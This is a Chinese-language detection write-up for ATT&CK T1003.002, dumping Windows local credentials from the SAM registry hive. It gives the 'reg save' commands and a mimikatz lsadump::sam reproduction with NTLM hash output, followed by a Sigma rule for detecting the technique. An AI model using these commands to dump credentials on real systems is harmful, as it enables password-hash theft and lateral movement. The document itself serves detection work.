# T1003-002--windows-基于SAM-reg凭证获取

## 来自ATT&CK的描述

凭证获取是从操作系统和软件中获取登录信息和密码的过程，通常为HASH散列或明文密码。然后使用凭证进行横向移动访问其他系统。

### SAM（Security Accounts Manager）

SAM文件是一个存储主机本地账户信息的数据库文件，通常是"net user"能看到的用户。想要枚举SAM数据库，你需要系统（system）权限才能够进行操作。它可以在两种模式下工作：在线（使用SYSTEM用户或令牌）或离线（使用SYSTEM＆SAMhives或backup）。

安全帐户管理器（SAM），往往是一个数据库文件在Windows XP中，Windows Vista中、Windows 7中、8.1和10存储用户的密码。它可用于验证本地和远程用户。从Windows 2000 SP4开始，Active Directory对远程用户进行身份验证。SAM使用加密措施来防止未经身份验证的用户访问系统。

用户密码以散列格式存储在注册表配置单元中，可以是LM哈希，也可以是NTLM哈希。可以在此文件中找到%SystemRoot%/system32/config/SAM并安装此文件HKLM/SAM。LM哈希是一种受损的协议，已被NTLM哈希取代。可以将大多数Windows版本配置为在用户更改密码时禁用有效LM哈希的创建和存储。Windows Vista和更高版本的Windows默认禁用LM哈希。

为了提高SAM数据库的安全性以防止脱机离线破解，Microsoft在Windows NT 4.0中引入了SYSKEY功能。启用SYSKEY后，SAM文件的磁盘副本将部分加密，以便SAM中存储的所有本地帐户的密码哈希值都使用密钥加密（通常也称为“SYSKEY”）。可以通过运行程序启用它。

## 测试案例

你可以使用许多工具进行检索读取SAM文件：

- pwdump.exe
- Mimikatz
- gsecdump
- ······

或者，可以使用Reg从注册表中提取SAM文件信息：

- reg save HKLM\SYSTEM SystemBkup.hiv
- reg save HKLM\SAM SamBkup.hiv

然后可以使用Creddump7或者hashcat在本地离线提取哈希值。

你也可以选择直接备份这些文件：

- C:\Windows\System32\config\SYSTEM
- C:\Windows\System32\config\SAM

值得注意的是：Rid 500账户是本地内置账户，Rid 501是来宾用户，用户账户以Rid 1000+开头。

## 检测日志

sysmon日志

## 测试复现

### 攻击方法：本地导出sam、system文件，离线进行hash提取(administrator)

```dos
C:\Users\me\Desktop>reg save hklm\sam sam.hiv
The operation completed successfully.

C:\Users\me\Desktop>reg save hklm\system system.hiv
The operation completed successfully.

mimikatz # lsadump::sam /sam:sam.hiv /system:system.hiv

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0

RID  : 000001f5 (501)
User : Guest

RID  : 000003eb (1003)
User : test
  Hash NTLM: a2345375a47a92754e2505132aca194b

RID  : 000003ec (1004)
User : test2
  Hash NTLM: f0873f3268072c7b1150b15670291137
```

## 测试留痕

暂无

## 检测规则/思路

### sigma规则

攻击方法：本地导出sam、system文件，离线进行hash提取(administrator)·

```yml
title: 本地导出sam、system文件，离线进行hash提取(administrator)
description: windows 7 模拟测试结果
references: https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump
tags: ATT&CK T1003-002
status: experimental
author: 12306Bro
logsource:
​    product: windows
​    service: sysmon
detection:
​    selection1:
​        EventID: 1
​        Image: 'C:\Windows\System32\reg.exe'
​        CommandLine: 'reg  save hklm\sam *.hiv'
​    selection2:
​        EventID: 1
​        Image: 'Image: C:\Windows\System32\reg.exe'
​        CommandLine: 'reg  save hklm\system *.hiv'
​    timeframe: last 2m
​    condition: all of them
level: high
```

### 建议

暂无

## 相关TIP
[[T1003-003-win-基于应用日志检测Ntdsutil获取凭证]]
[[T1003-003-win-基于NTDS凭证获取1]]
[[T1003-003-win-使用ntdsutil获得NTDS.dit文件]]
[[T1003-003-win-ntds凭证获取]]
[[T1003-003-win-vssown.vbs获取NTDS.dit]]
[[T1003-004-win-LSA-mimikatz凭证转储]]
[[T1003-005-win-DCC2-mimikatz凭证转储]]
[[T1003-006-win-DCsysnc-凭证转储]]
[[T1003-win-使用comsvc​​s.dll转储Lsass.exe内存]]
[[T1003-win-使用Windows任务管理器转储Lsass.exe内存]]
[[T1003-win-Procdump凭证转储]]
[[T1003-win-vaultcmd获取系统凭证基本信息]]

## 参考推荐

MITRE-ATT&CK-T1003-002

<https://attack.mitre.org/techniques/T1003/002>

pwdump7

<http://passwords.openwall.net/b/pwdump/pwdump7.zip>

powershell

<https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1>

mimikatz wiki

<https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump>

关于更多通过SAM数据库获取本地用户hash你也可以参考

<https://www.4hou.com/technology/10878.html>
